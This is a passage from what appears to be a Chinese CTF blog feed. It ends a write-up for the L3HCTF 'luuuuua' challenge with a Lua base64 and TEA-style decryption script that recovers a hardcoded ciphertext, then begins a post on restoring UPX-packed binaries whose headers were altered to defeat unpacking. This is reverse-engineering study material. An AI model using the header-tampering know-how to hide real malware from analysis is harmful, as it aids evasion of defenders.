class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> base64 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> extract = <span class="built_in">_G</span>.bit32 <span class="keyword">and</span> <span class="built_in">_G</span>.bit32.extract <span class="comment">-- Lua 5.2/Lua 5.3 in compatibility mode</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> extract <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">_G</span>.bit <span class="keyword">then</span> <span class="comment">-- LuaJIT</span></span><br><span class="line">    <span class="keyword">local</span> shl, shr, band = <span class="built_in">_G</span>.bit.lshift, <span class="built_in">_G</span>.bit.rshift, <span class="built_in">_G</span>.bit.band</span><br><span class="line">    extract = <span class="function"><span class="keyword">function</span><span class="params">( v, from, width )</span></span></span><br><span class="line">      <span class="keyword">return</span> band( shr( v, from ), shl( <span class="number">1</span>, width ) - <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">elseif</span> <span class="built_in">_G</span>.<span class="built_in">_VERSION</span> == <span class="string">&quot;Lua 5.1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    extract = <span class="function"><span class="keyword">function</span><span class="params">( v, from, width )</span></span></span><br><span class="line">      <span class="keyword">local</span> w = <span class="number">0</span></span><br><span class="line">      <span class="keyword">local</span> flag = <span class="number">2</span>^from</span><br><span class="line">      <span class="keyword">for</span> i = <span class="number">0</span>, width<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> flag2 = flag + flag</span><br><span class="line">        <span class="keyword">if</span> v % flag2 &gt;= flag <span class="keyword">then</span></span><br><span class="line">          w = w + <span class="number">2</span>^i</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        flag = flag2</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">return</span> w</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span> <span class="comment">-- Lua 5.3+</span></span><br><span class="line">    extract = <span class="built_in">load</span><span class="string">[[return function( v, from, width )</span></span><br><span class="line"><span class="string">return ( v &gt;&gt; from ) &amp; ((1 &lt;&lt; width) - 1)</span></span><br><span class="line"><span class="string">end]]</span>()</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64.makeencoder</span><span class="params">( s62, s63, spad )</span></span></span><br><span class="line">  <span class="keyword">local</span> encoder = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> b64code, <span class="built_in">char</span> <span class="keyword">in</span> <span class="built_in">pairs</span>&#123;[<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,s62 <span class="keyword">or</span> <span class="string">&#x27;+&#x27;</span>,s63 <span class="keyword">or</span><span class="string">&#x27;/&#x27;</span>,spad <span class="keyword">or</span><span class="string">&#x27;=&#x27;</span>&#125; <span class="keyword">do</span></span><br><span class="line">    encoder[b64code] = <span class="built_in">char</span>:<span class="built_in">byte</span>()</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> encoder</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64.makedecoder</span><span class="params">( s62, s63, spad )</span></span></span><br><span class="line">  <span class="keyword">local</span> decoder = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> b64code, charcode <span class="keyword">in</span> <span class="built_in">pairs</span>( base64.makeencoder( s62, s63, spad )) <span class="keyword">do</span></span><br><span class="line">    decoder[charcode] = b64code</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> decoder</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> DEFAULT_ENCODER = base64.makeencoder()</span><br><span class="line"><span class="keyword">local</span> DEFAULT_DECODER = base64.makedecoder()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">char</span>, <span class="built_in">concat</span> = <span class="built_in">string</span>.<span class="built_in">char</span>, <span class="built_in">table</span>.<span class="built_in">concat</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64.encode</span><span class="params">( str, encoder, usecaching )</span></span></span><br><span class="line">  encoder = encoder <span class="keyword">or</span> DEFAULT_ENCODER</span><br><span class="line">  <span class="keyword">local</span> t, k, n = &#123;&#125;, <span class="number">1</span>, #str</span><br><span class="line">  <span class="keyword">local</span> lastn = n % <span class="number">3</span></span><br><span class="line">  <span class="keyword">local</span> cache = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, n-lastn, <span class="number">3</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> a, b, c = str:<span class="built_in">byte</span>( i, i+<span class="number">2</span> )</span><br><span class="line">    <span class="keyword">local</span> v = a*<span class="number">0x10000</span> + b*<span class="number">0x100</span> + c</span><br><span class="line">    <span class="keyword">local</span> s</span><br><span class="line">    <span class="keyword">if</span> usecaching <span class="keyword">then</span></span><br><span class="line">      s = cache[v]</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">then</span></span><br><span class="line">        s = <span class="built_in">char</span>(encoder[extract(v,<span class="number">18</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">12</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">6</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">0</span>,<span class="number">6</span>)])</span><br><span class="line">        cache[v] = s</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      s = <span class="built_in">char</span>(encoder[extract(v,<span class="number">18</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">12</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">6</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">0</span>,<span class="number">6</span>)])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    t[k] = s</span><br><span class="line">    k = k + <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> lastn == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> a, b = str:<span class="built_in">byte</span>( n<span class="number">-1</span>, n )</span><br><span class="line">    <span class="keyword">local</span> v = a*<span class="number">0x10000</span> + b*<span class="number">0x100</span></span><br><span class="line">    t[k] = <span class="built_in">char</span>(encoder[extract(v,<span class="number">18</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">12</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">6</span>,<span class="number">6</span>)], encoder[<span class="number">64</span>])</span><br><span class="line">  <span class="keyword">elseif</span> lastn == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> v = str:<span class="built_in">byte</span>( n )*<span class="number">0x10000</span></span><br><span class="line">    t[k] = <span class="built_in">char</span>(encoder[extract(v,<span class="number">18</span>,<span class="number">6</span>)], encoder[extract(v,<span class="number">12</span>,<span class="number">6</span>)], encoder[<span class="number">64</span>], encoder[<span class="number">64</span>])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">concat</span>( t )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64.decode</span><span class="params">( b64, decoder, usecaching )</span></span></span><br><span class="line">  decoder = decoder <span class="keyword">or</span> DEFAULT_DECODER</span><br><span class="line">  <span class="keyword">local</span> pattern = <span class="string">&#x27;[^%w%+%/%=]&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> decoder <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> s62, s63</span><br><span class="line">    <span class="keyword">for</span> charcode, b64code <span class="keyword">in</span> <span class="built_in">pairs</span>( decoder ) <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> b64code == <span class="number">62</span> <span class="keyword">then</span> s62 = charcode</span><br><span class="line">      <span class="keyword">elseif</span> b64code == <span class="number">63</span> <span class="keyword">then</span> s63 = charcode</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    pattern = (<span class="string">&#x27;[^%%w%%%s%%%s%%=]&#x27;</span>):<span class="built_in">format</span>( <span class="built_in">char</span>(s62), <span class="built_in">char</span>(s63) )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  b64 = b64:<span class="built_in">gsub</span>( pattern, <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">  <span class="keyword">local</span> cache = usecaching <span class="keyword">and</span> &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> t, k = &#123;&#125;, <span class="number">1</span></span><br><span class="line">  <span class="keyword">local</span> n = #b64</span><br><span class="line">  <span class="keyword">local</span> padding = b64:<span class="built_in">sub</span>(<span class="number">-2</span>) == <span class="string">&#x27;==&#x27;</span> <span class="keyword">and</span> <span class="number">2</span> <span class="keyword">or</span> b64:<span class="built_in">sub</span>(<span class="number">-1</span>) == <span class="string">&#x27;=&#x27;</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, padding &gt; <span class="number">0</span> <span class="keyword">and</span> n<span class="number">-4</span> <span class="keyword">or</span> n, <span class="number">4</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> a, b, c, d = b64:<span class="built_in">byte</span>( i, i+<span class="number">3</span> )</span><br><span class="line">    <span class="keyword">local</span> s</span><br><span class="line">    <span class="keyword">if</span> usecaching <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> v0 = a*<span class="number">0x1000000</span> + b*<span class="number">0x10000</span> + c*<span class="number">0x100</span> + d</span><br><span class="line">      s = cache[v0]</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> v = decoder[a]*<span class="number">0x40000</span> + decoder[b]*<span class="number">0x1000</span> + decoder[c]*<span class="number">0x40</span> + decoder[d]</span><br><span class="line">        s = <span class="built_in">char</span>( extract(v,<span class="number">16</span>,<span class="number">8</span>), extract(v,<span class="number">8</span>,<span class="number">8</span>), extract(v,<span class="number">0</span>,<span class="number">8</span>))</span><br><span class="line">        cache[v0] = s</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">local</span> v = decoder[a]*<span class="number">0x40000</span> + decoder[b]*<span class="number">0x1000</span> + decoder[c]*<span class="number">0x40</span> + decoder[d]</span><br><span class="line">      s = <span class="built_in">char</span>( extract(v,<span class="number">16</span>,<span class="number">8</span>), extract(v,<span class="number">8</span>,<span class="number">8</span>), extract(v,<span class="number">0</span>,<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    t[k] = s</span><br><span class="line">    k = k + <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> padding == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> a, b, c = b64:<span class="built_in">byte</span>( n<span class="number">-3</span>, n<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">local</span> v = decoder[a]*<span class="number">0x40000</span> + decoder[b]*<span class="number">0x1000</span> + decoder[c]*<span class="number">0x40</span></span><br><span class="line">    t[k] = <span class="built_in">char</span>( extract(v,<span class="number">16</span>,<span class="number">8</span>), extract(v,<span class="number">8</span>,<span class="number">8</span>))</span><br><span class="line">  <span class="keyword">elseif</span> padding == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> a, b = b64:<span class="built_in">byte</span>( n<span class="number">-3</span>, n<span class="number">-2</span> )</span><br><span class="line">    <span class="keyword">local</span> v = decoder[a]*<span class="number">0x40000</span> + decoder[b]*<span class="number">0x1000</span></span><br><span class="line">    t[k] = <span class="built_in">char</span>( extract(v,<span class="number">16</span>,<span class="number">8</span>))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">concat</span>( t )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt_u64</span><span class="params">(st, bu)</span></span></span><br><span class="line">  <span class="keyword">local</span> skt0, skt1 = st.skt0, st.skt1</span><br><span class="line">  <span class="keyword">local</span> v0, v1 = bu &gt;&gt; <span class="number">32</span>, bu &amp; <span class="number">4294967295</span></span><br><span class="line">  <span class="keyword">local</span> sum, delta = <span class="number">0</span>, <span class="number">2654435769</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">64</span> <span class="keyword">do</span></span><br><span class="line">    v0 = v0 + (((v1) &lt;&lt; <span class="number">4</span> ~ (v1) &gt;&gt; <span class="number">5</span>) + (v1) ~ skt0[i]) &amp; <span class="number">4294967295</span></span><br><span class="line">    v1 = v1 + (((v0) &lt;&lt; <span class="number">4</span> ~ (v0) &gt;&gt; <span class="number">5</span>) + (v0) ~ skt1[i]) &amp; <span class="number">4294967295</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  bu = (v0) &lt;&lt; <span class="number">32</span> | v1</span><br><span class="line">  <span class="keyword">return</span> bu</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keysetup</span><span class="params">(key)</span></span></span><br><span class="line">  <span class="built_in">assert</span>(#key == <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">local</span> kt = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">  kt[<span class="number">1</span>],kt[<span class="number">2</span>],kt[<span class="number">3</span>],kt[<span class="number">4</span>] = <span class="built_in">string</span>.<span class="built_in">unpack</span>(<span class="string">&quot;&gt;I4I4I4I4&quot;</span>, key)</span><br><span class="line">  <span class="keyword">local</span> skt0 = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> skt1 = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> sum, delta = <span class="number">0</span>, <span class="number">2654435769</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, <span class="number">64</span> <span class="keyword">do</span></span><br><span class="line">    skt0[i] = sum + kt[(sum &amp; <span class="number">3</span>) + <span class="number">1</span>]</span><br><span class="line">    sum = sum + delta &amp; <span class="number">4294967295</span></span><br><span class="line">    skt1[i] = (sum) + kt[((sum) &gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>) + <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">return</span> &#123;skt0 = skt0, skt1 = skt1&#125; <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec</span><span class="params">(key, iv, itxt)</span></span></span><br><span class="line">  <span class="built_in">assert</span>(#key == <span class="number">16</span>, <span class="string">&quot;bad key length&quot;</span>)</span><br><span class="line">  <span class="built_in">assert</span>(#iv == <span class="number">8</span>, <span class="string">&quot;bad IV length&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> #itxt == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> ivu = <span class="built_in">string</span>.<span class="built_in">unpack</span>(<span class="string">&quot;&lt;I8&quot;</span>, iv)</span><br><span class="line">  <span class="keyword">local</span> ot = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> rbn = #itxt</span><br><span class="line">  <span class="built_in">print</span>(rbn)</span><br><span class="line">  <span class="keyword">local</span> ksu, ibu, ob = <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">local</span> st = keysetup(key)</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, #itxt, <span class="number">8</span> <span class="keyword">do</span></span><br><span class="line">    ksu = encrypt_u64(st, ivu ~ i)</span><br><span class="line">    <span class="keyword">if</span> rbn &lt; <span class="number">8</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> buffer = (<span class="built_in">string</span>.<span class="built_in">sub</span>)(itxt, i) .. (<span class="built_in">string</span>.<span class="built_in">rep</span>)(<span class="string">&quot;\000&quot;</span>, <span class="number">8</span> - rbn)</span><br><span class="line">      ibu = <span class="built_in">string</span>.<span class="built_in">unpack</span>(<span class="string">&quot;&lt;I8&quot;</span>, buffer)</span><br><span class="line">      ob = (<span class="built_in">string</span>.<span class="built_in">sub</span>)(<span class="built_in">string</span>.pack(<span class="string">&quot;&lt;I8&quot;</span>, ibu ~ ksu), <span class="number">1</span>, rbn)</span><br><span class="line">      <span class="built_in">print</span>(ob)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ibu = <span class="built_in">string</span>.<span class="built_in">unpack</span>(<span class="string">&quot;&lt;I8&quot;</span>, itxt, i)</span><br><span class="line">      ob = <span class="built_in">string</span>.pack(<span class="string">&quot;&lt;I8&quot;</span>, ibu ~ ksu)</span><br><span class="line">      <span class="built_in">print</span>(ob)</span><br><span class="line">      rbn = rbn - <span class="number">8</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">table</span>.<span class="built_in">insert</span>(ot, ob)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(ot,ob) <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">dec(<span class="string">&quot;L3H_Sec!@#$%^&amp;*(&quot;</span>,<span class="string">&quot;1qazxsw2&quot;</span>,base64.decode(<span class="string">&quot;LKq2dSc30DKJo99bsFgTkQM9dor1gLl2rejdnkw2MBpOud+38vFkCCF13qY=&quot;</span>))</span><br></pre></td></tr></table></figure><article class="message is-warning"><div class="message-body"><p>由于本人还没有深入了解过 lua 虚拟机的实现以及安卓开发，所以文章中有哪些描述不正确的地方希望大家见谅</p></div></article><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/iskolbin/lbase64">lua base64模块</a></li><li><a href="https://github.com/mkottman/AndroLua">https://github.com/mkottman/AndroLua</a></li><li><a href="https://github.com/jasonsantos/luajava">https://github.com/jasonsantos/luajava</a></li><li><a href="https://www.jianshu.com/p/908a1ac893bb">Android Lua 相互调用</a></li><li><a href="https://bbs.pediy.com/thread-216969.htm">浅析android手游lua脚本的加密与解密</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;L3HCTF luuuuua 的题解，非预期警告&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UPX 壳反解压技术</title>
    <link href="https://www.0wl.site/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.0wl.site/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/</id>
    <published>2021-10-04T08:34:40.000Z</published>
    <updated>2021-10-04T09:49:10.807Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>TSGCTF optimized 中用到的 UPX 壳的反解压</p></div></article><span id="more"></span><h2 id="判断是否加壳"><a href="#判断是否加壳" class="headerlink" title="判断是否加壳"></a>判断是否加壳</h2><ul><li>不标准的段名，静态链接</li><li>找不到输出字符串</li><li>entry point 在其他地方</li></ul><p>一些通过 upx 压缩的文件可能不会被识别为 upx 压缩过的，基本上是通过更改文件头中的一些数据实现的（可根据 upx -d 的报错判断）</p><h2 id="upx-文件头结构"><a href="#upx-文件头结构" class="headerlink" title="upx 文件头结构"></a>upx 文件头结构</h2><img src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/upxstruct.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">b_info</span> // 12-<span class="title">byte</span> <span class="title">header</span> <span class="title">before</span> <span class="title">each</span> <span class="title">compressed</span> <span class="title">block</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> sz_unc; <span class="comment">// uncompressed_size</span></span><br><span class="line"><span class="keyword">uint32_t</span> sz_cpr; <span class="comment">// compressed_size</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_method; <span class="comment">// compression algorithm</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_ftid; <span class="comment">// filter id</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_cto8; <span class="comment">// filter parameter</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_unused; <span class="comment">// unused</span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">l_info</span> // 12-<span class="title">byte</span> <span class="title">trailer</span> <span class="title">in</span> <span class="title">header</span> <span class="title">for</span> <span class="title">loader</span> (<span class="title">offset</span> 116)</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> l_checksum; <span class="comment">// checksum</span></span><br><span class="line"><span class="keyword">uint32_t</span> l_magic; <span class="comment">// UPX! magic [55 50 58 21]</span></span><br><span class="line"><span class="keyword">uint16_t</span> l_lsize; <span class="comment">// loader size</span></span><br><span class="line"><span class="keyword">uint8_t</span> l_version; <span class="comment">// version info</span></span><br><span class="line"><span class="keyword">uint8_t</span> l_format; <span class="comment">// UPX format </span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">p_info</span> // 12-<span class="title">byte</span> <span class="title">packed</span> <span class="title">program</span> <span class="title">header</span> <span class="title">follows</span> <span class="title">stub</span> <span class="title">loader</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> p_progid; <span class="comment">// program header id [00 00 00 00]</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_filesize; <span class="comment">// filesize [same as blocksize]</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_blocksize; <span class="comment">// blocksize [same as filesize] </span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>现在主要伪造的是 p_info ,l_info 里的内容，在b_info 暂时还没有伪造方法</p><h2 id="复原"><a href="#复原" class="headerlink" title="复原"></a>复原</h2><img 